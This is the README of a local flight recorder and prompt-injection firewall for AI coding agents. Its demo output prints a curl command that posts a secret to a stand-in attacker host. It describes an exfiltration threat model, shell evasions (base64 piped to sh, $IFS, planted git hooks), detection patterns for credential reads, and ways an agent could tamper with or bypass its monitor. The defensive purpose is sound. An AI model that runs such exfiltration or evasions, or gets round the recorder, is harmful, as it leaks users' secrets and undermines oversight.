# agent-blackbox

**A tamper-evident flight recorder and prompt-injection firewall for AI coding agents.** Claude Code first; Codex, Cursor and Gemini CLI through adapters (`blackbox install --agent codex|cursor|gemini`; see [docs/AGENTS.md](docs/AGENTS.md) for what each can enforce).

> Everything runs on your machine. No account, no cloud, no telemetry: nothing is ever uploaded.

Every prompt, tool call and tool result is written to an append-only ledger that is hash-chained and Ed25519-signed by a separate process, with secrets replaced by fingerprints before anything touches disk. A small policy engine watches each session for the **lethal trifecta** (private data + untrusted content + an outbound call) and stops the call before it runs.

```
$ blackbox demo
  allowed  Read /tmp/demo-repo/.env
  allowed  WebFetch https://setup-docs.example.net/install
  DENIED   Bash curl -s -X POST https://collect.attacker.example/k -d "k=sk-demo-…"
           you see:    blocked Bash: A secret this session read earlier (fingerprint 5b37…) appears in an outbound call
           agent sees: Blocked by the local security policy. Do not retry or work around this; …
  ASK      Bash curl -s https://collect.attacker.example/ping
           Lethal trifecta: this session read private data (Read .env) and untrusted content (WebFetch …)
  allowed  Bash npm test
```

No dependencies. Node 18+.

## What did your agent do last month?

Audit your existing Claude Code history in seconds, without installing anything:

```bash
npx agent-blackbox scan                 # or: node dist/bin/blackbox.js scan
npx agent-blackbox scan --card me.svg   # a shareable card with numbers only
```

It replays your past sessions (`~/.claude/projects`) through the policy and tells you how many read secrets, ingested web content, called out, and which calls would have been blocked. Use `--days N`, `--details` or `--json`. Transcripts are replayed on worker threads (one per core, up to 8); `--jobs N` sets the count and `--jobs 1` keeps it single-threaded.

```bash
npx agent-blackbox scan --html          # local HTML report: tool categories, projects, skills, MCP servers, hosts
npx agent-blackbox skills               # audit every installed skill (Claude Code, Cursor, Codex, Copilot…)
npx agent-blackbox mcp                  # which MCP servers were used, which tools, and a config audit
npx agent-blackbox share                # X card, story image and a 10 s video, numbers only
```

`skills` and `mcp` look for download-and-run commands, hidden instructions, plaintext secrets, unpinned packages, privileged containers and more. `--pin` records the current state so a later change is flagged; `--fail-on high` makes them usable in CI. With the recorder installed, risky skills and MCP servers also trigger a live confirmation before the agent uses them.

## Install

As a Claude Code plugin (inside Claude Code):

```
/plugin marketplace add developerfred/agent-blackbox
/plugin install agent-blackbox@agent-blackbox
```

The plugin brings the hooks: every prompt, tool call and result is recorded and gated. For the model-level telemetry as well, add `npx agent-blackbox install --telemetry-only`. If you also run `blackbox install`, the plugin steps aside so nothing is recorded twice.

Or with the CLI:

```bash
# Homebrew (tap)
brew install developerfred/tap/agent-blackbox
# or from source
git clone https://github.com/developerfred/agent-blackbox && cd agent-blackbox && npm link

blackbox install          # adds hooks + telemetry to ~/.claude/settings.json and starts the recorder
blackbox demo --tamper    # simulated attack + tampering attempt
```

Start a new Claude Code session. It will say it is being recorded. Then:

```bash
blackbox timeline --last   # what the agent did, step by step
blackbox ui                # the same, in the browser (opens with a private access token)
blackbox brief --last      # the same session as a Markdown summary, for a PR or a handoff
blackbox verify            # prove nothing was changed
```

`blackbox uninstall` removes the hooks and keeps the evidence.

## Policy

Decisions happen in the `PreToolUse` hook, in milliseconds, before the tool runs.

| Rule | Trigger | Decision |
| --- | --- | --- |
| `secret-egress` | A secret value read earlier in the session appears in an outbound call (Bash, WebFetch, WebSearch, MCP), toward any host | deny |
| `sensitive-egress` | One command both reads a sensitive file (`.env`, `~/.ssh`, keystores…) and sends data out | deny |
| `lethal-trifecta` | The session touched private data **and** untrusted content, and now calls a host the user did not name | ask (configurable) |
| `lethal-trifecta` (code) | Same, but the call runs code the policy cannot inspect: a script the agent wrote or downloaded, inline or heredoc code, `\| sh`, `eval`, a planted git hook, a test runner after risky edits | ask (`opaqueCode`) |
| `secret-to-code` | A secret read earlier is passed to such code | ask |
| `web3-transaction` | The agent signs or broadcasts a transaction (`cast send`, `forge script --broadcast`, `solana transfer`, `eth_sendRawTransaction`, a wallet MCP tool) or passes key material on a command line | ask (`web3`: `ask`, `alert`, `off`) |
| `sensitive-read` | The agent reads a `.env`, key, credential or wallet file (`Read`, `Grep`, `cat` and similar) before the call runs; `.env.example` is exempt | ask (`sensitiveReads`: `ask`, `alert`, `off`) |
| `memory-write` | A session that read untrusted content writes to a file later sessions trust as instructions: `AGENTS.md`, `CLAUDE.md`, `.claude/commands|agents|rules|skills`, Cursor, Windsurf, Cline, Copilot and Continue rules (also through `>>`, `tee`, `sed -i`) | ask (`memoryWrites`: `ask`, `alert`, `off`) |
| `memory-write` (provenance) | A document a tainted session wrote (see above) is read by a later session, or loaded at its start (`CLAUDE.md`, `AGENTS.md`, `~/.claude/CLAUDE.md`…): that session starts as untrusted content. Declare a reviewed document with `trustedDocs` | marks the session (taint) |
| `post-denial` | Something was already denied in this session, and a call goes out | ask |
| `self-protection` | The agent touches `~/.blackbox` (quotes, backslashes and globs undone first) | deny |
| `hook-tamper` | The agent edits Claude Code settings or plugin files; the daemon also checks the hooks every minute | ask / alert |

- **Private data**: sensitive paths (including wallet files: Foundry and Geth keystores, Solana and Sui keypairs, `wallet.dat`), private keys and seed phrases (recognized by their label, so a bare transaction hash is not a secret), secret-looking values in tool output, and commands that print credentials (`env`, `printenv`, `gh auth token`, `aws secretsmanager …`, `kubectl get secret`, …).
- **Untrusted content**: WebFetch, WebSearch, MCP tool results, the output of network commands, and files the agent reads (Read, Grep, `cat`) whose text overrides instructions or asks an AI to send secrets out. Plain guidance in a `CLAUDE.md` or `CONTRIBUTING.md` does not count, so reading files does not raise an alarm.
- **Outbound**: network tools, network code in interpreters, downloads with a URL (`git clone`, `npm install <url>`, `pip install git+…`, `open <url>`), and publishing commands (`git push`, `gh gist`/`issue`/`pr`/`api` writes, `npm publish`, S3/GCS uploads, mail) even toward allowlisted hosts. Commands are matched before and after undoing quotes, backslashes, `$'\x..'` strings and `$IFS`.
- **User intent**: hosts you type in your own prompt are allowed destinations for that session. Pasted text and turns Claude Code starts on its own never widen the list.
- **Denials stay quiet**: when a call is denied, the agent is told only that the policy blocked it. The rule, the fingerprint and the reason go to you and to the ledger, so a prompt injection cannot learn what is protected by probing.

`blackbox mode ask|deny|monitor` changes how the trifecta rule acts. Hosts in `allowHosts` (`~/.blackbox/config.json`) are not counted as egress. The recorder never returns "allow": it can only add friction, never skip Claude Code's own permission checks.

## What it captures

| Channel | Source | What you get |
| --- | --- | --- |
| Hooks | 13 Claude Code lifecycle events | Every prompt, tool call with arguments, tool result, subagent, stop |
| Native telemetry | Claude Code OpenTelemetry logs (OTLP/HTTP JSON) | Cost, tokens, permission decisions, hook runs, MCP connections |
| Prompt and response text via telemetry (opt-in, `install --prompts`) | `OTEL_LOG_USER_PROMPTS`, `OTEL_LOG_ASSISTANT_RESPONSES` | The text of prompts and answers (the hooks already record each prompt) |
| Raw model I/O (opt-in, `install --raw`) | `OTEL_LOG_RAW_API_BODIES=file:` | The full request and response of every model call |

All three are linked by `session_id`, `prompt_id` and `tool_use_id`.

## Keeping the evidence from becoming a leak

A recorder that sees everything is itself a target. agent-blackbox stores proof of what happened, not your secrets:

- **Secrets are replaced before anything is written.** API keys, tokens, private keys and `.env`-style `KEY=value` pairs become `[secret:<fingerprint>]` in every summary and payload. The fingerprint is an HMAC with a per-install key, so the ledger can say "secret `a91f…` was read at #5 and tried to leave at #12" without holding the value.
- **Every endpoint needs a token**, including reads. `blackbox ui` opens the page with it in the URL fragment, which is never sent over the network. Other local users and processes get `401`.
- **Files are private** (`0700` folders, `0600` files), and the agent is blocked from `~/.blackbox` through its tools.
- **Encrypted at rest, one key per session.** Payloads, and the one-line summary of each hook record (prompt, command and path text), are sealed with AES-256-GCM under a random key for their session, stored wrapped by a master key. Copies of the folder (backups, Time Machine, cloud sync, a tool indexing your disk) hold only ciphertext.
- **Erase for real.** `blackbox purge --session ID` or `--days N` destroys session keys: those payloads and summaries become unreadable everywhere, including in backups made earlier. The chain keeps every hash and still verifies. `blackbox show <n>` prints one decrypted payload. To do it automatically, set `"retainDays": 30` in `~/.blackbox/config.json`: sessions older than that are erased at start and every hour (off by default).
- **Raw model bodies are off by default.** With `--raw`, Claude Code itself writes each body in clear text to `~/.blackbox/api-bodies/`; the recorder scrubs and moves it as soon as Claude Code indexes it (at most ~3 minutes later).

What is recorded, where, for how long, and what the defaults do not cover: [docs/PRIVACY.md](docs/PRIVACY.md).

## The evidence

```
~/.blackbox/
  ledger.jsonl     one record per line: seq, ts, kind, summary, payload digest, prev, hash, sig
  blobs/<key>/     scrubbed payloads, encrypted per session, named by the sha256 of their content
  keys/            Ed25519 signing key, master key, wrapped session keys (only the daemon uses them)
  anchors.jsonl    chain heads you exported with `blackbox anchor`
```

The format is specified in [docs/spec/ledger-v1.md](docs/spec/ledger-v1.md) (draft, with test vectors), so a verifier does not need this code. `blackbox export` writes the ledger as [OpenTelemetry GenAI](docs/OTEL.md) traces and logs: metadata only, to a local folder unless you pass `--endpoint`.

Each record's `hash` covers its content and the previous record's hash; `sig` signs that hash. `blackbox verify` recomputes everything and names the first broken record. `blackbox anchor` prints the signed head: publish it somewhere the agent cannot write (a git commit, a gist, a transparency log) and any later rewrite of history, including cutting off the last records, will no longer match it. `blackbox anchor --batch` also commits to a batch of records with a Merkle root, so one record can be proven to belong to a published anchor without handing over the rest ([docs/ANCHORING.md](docs/ANCHORING.md)).

The format is an open, versioned specification: [docs/spec/ledger-v1.md](docs/spec/ledger-v1.md), with [test vectors](docs/spec/vectors/) and a standalone verifier with no dependencies, [verifier/bb-verify.js](verifier/README.md), so anyone can check a ledger without trusting or installing the recorder.

## Grounded in research

The design follows what recent work recommends: deterministic policy on actions, outside the model. Most relevant:
[Design Patterns for Securing LLM Agents](https://arxiv.org/abs/2506.08837) (the principle behind the trifecta rule),
[Progent](https://arxiv.org/abs/2504.11703) (user-scoped least privilege),
[Causality Laundering](https://arxiv.org/abs/2604.04035) (why denials must stay quiet),
[How Your Credentials Are Leaked by LLM Agent Skills](https://arxiv.org/abs/2604.03070) (credential output as private data),
[Agent Flight Recorder](https://arxiv.org/html/2609.01931) (tamper-evident audit trails),
and [The Attacker Moves Second](https://arxiv.org/abs/2510.09023), which is why we publish no protection rate until it has been measured against adaptive attacks. See [ROADMAP.md](ROADMAP.md).

## How well does the policy work?

`blackbox eval` runs the policy against [eval/corpus.ts](eval/corpus.ts): known evasions (quote splitting, `$IFS`, ANSI-C strings, writing a script and then running it, heredocs, `base64 | sh`, planted git hooks, publishing through `gh`, glob paths to the evidence) and benign commands that must stay quiet. Today: 71 of 71 attacks caught, 0 of 28 false alarms, and no known gaps open. The corpus lists a gap openly when one is found. These are static attacks we know about; an attacker who studies the policy will find others. Add one to the corpus, or report it (SECURITY.md).

## Honest limitations (v0.3)

Closed since earlier versions: payloads and summaries are now encrypted per session and erased by `purge` or `retainDays`; prompt and response text through telemetry is opt-in; `install` prints the key and fail-open posture and offers `--fail-closed`; `scan` runs in parallel; and the corpus has no known gaps open. What remains:

- **Same-user processes are not stopped by the OS, unless you run the recorder as a dedicated user.** `blackbox harden` prints a script (read it first; it changes nothing by itself) that runs the recorder as its own OS user with root-owned code, so an agent running as you can write evidence but not read, rewrite or erase it. It has been run on a real macOS machine (launchd); **the Linux/systemd path has not been run on a real machine yet.** After it: `blackbox harden --check` confirms the setup and warns about what is still reachable (the old `~/.blackbox` keys and ledger from before; hooks that still run from an editable clone: run `blackbox install` so they point at the root-owned copy). Without `harden`, any process running as you can read the master and signing keys, decrypt payloads, and rewrite the ledger and re-sign it; the rules protecting `~/.blackbox` are pattern matching on tool arguments, not an OS boundary. What holds either way: a rewrite cannot match a chain head you already published with `blackbox anchor`, and erased session keys stay erased.
- **The firewall catches known patterns, not every attack.** It stops naive exfiltration and the evasions in the corpus. An adaptive attacker can get through: injection detection in files is a heuristic on wording, a pre-existing script is only inspected if the recorder can read it (not when it runs as a dedicated user that cannot see your home folder), and a long opaque value in a URL is judged by its shape. Treat it as friction and evidence, not a guarantee.
- **Persistent instruction files are protected by path and provenance, not by reading them.** A session that read untrusted content asks before it writes `AGENTS.md`, `CLAUDE.md`, editor rules, agent commands or skills (`memoryWrites`); if such a write goes through, a later session that reads or auto-loads that file starts as untrusted. The list of files is fixed (a "brain" folder under another name is not covered), a marked file stays marked until you declare it reviewed in `trustedDocs` (no content hashing yet), and a poisoned file written outside a session the recorder saw is not known.
- **Integrity is not completeness.** The chain proves nothing recorded was altered; it cannot prove everything was recorded. If the daemon is down the hook spools events and restarts it. Removing the hooks or setting `disableAllHooks` is detected and recorded (the daemon checks once a minute and on every session start), but not prevented. To make the hooks admin-owned, put them in Claude Code managed settings: `blackbox managed-settings` prints the block (it has not been tried on a real machine yet). With the recorder as its own user the daemon cannot see your Claude Code settings, so that periodic check is off; `blackbox status` and `harden --check` run it as you.
- **Fail-open by default.** If the recorder is unreachable, tools still run (`blackbox install --fail-closed`, or `"failMode": "closed"` in the config, denies instead). `blackbox install` prints which of the two postures you are in, and whether the recorder runs as a dedicated user.
- **HTTPS payloads of shell commands are not visible**; the command line is, before it runs, and that is where the policy acts.
- **Heuristics, not proofs.** Secret detection matches patterns and exact values; encoded or split secrets can slip through.
- **User intent is inferred from your prompt text.** If you name a host, calls to it are not asked about (secrets are still denied).
- Claude Code only for now. The `skills` and `mcp` audits read the configuration of Cursor, Codex, Copilot and others, but recording and the policy are Claude Code hooks; adapters are Phase 1 of the roadmap.

## Documentation

- [Project site](https://developerfred.github.io/agent-blackbox/): overview, install, policy and privacy in one page
- [docs/PRIVACY.md](docs/PRIVACY.md): what is recorded, where, for how long
- [docs/spec/ledger-v1.md](docs/spec/ledger-v1.md): the open ledger and event format
- [docs/OTEL.md](docs/OTEL.md): OpenTelemetry GenAI export
- [SECURITY.md](SECURITY.md): reporting a vulnerability or a policy bypass
- [ROADMAP.md](ROADMAP.md): phases and gates

## Português (resumo)

Gravador de caixa-preta para agentes de IA. Tudo roda na sua máquina, sem conta e sem nuvem. `blackbox scan` audita seu histórico do Claude Code sem instalar nada. `blackbox install` grava e protege as próximas sessões; veja tudo com `blackbox timeline --last` ou `blackbox ui`. `blackbox demo --tamper` mostra um ataque de prompt injection sendo barrado e uma adulteração do histórico sendo detectada. Para remover: `blackbox uninstall` (as evidências ficam em `~/.blackbox`).

## License

Apache-2.0
